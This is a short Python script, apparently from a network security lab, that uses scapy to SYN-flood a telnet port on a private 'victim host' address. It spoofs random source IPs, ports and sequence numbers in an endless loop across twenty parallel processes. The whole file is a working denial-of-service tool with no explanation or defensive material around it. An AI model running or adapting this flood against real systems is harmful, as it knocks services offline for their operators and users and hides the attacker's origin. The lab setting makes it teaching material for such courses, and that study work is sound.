#!/bin/env python3

from scapy.all import IP, TCP, send
from ipaddress import IPv4Address
from random import getrandbits
from multiprocessing import Process
from multiprocessing import Pool

def SYN():
    ip = IP(dst="10.9.0.5") # 10.9.0.5 victim host
    tcp = TCP(dport=23, flags='S') # telnet dport is d23 and set flag to S"SYN"
    pkt = ip/tcp
    while True:
        pkt[IP].src = str(IPv4Address(getrandbits(32))) # source iP
        pkt[TCP].sport = getrandbits(16) # source port
        pkt[TCP].seq = getrandbits(32) # sequence number
        send(pkt, verbose = 0)
if __name__=='__main__':
    
    Num_Proc=20
    p=Pool(Num_Proc)
    for i in range (Num_Proc):
        p.apply_async(SYN)
    p.close()
    p.join()
    
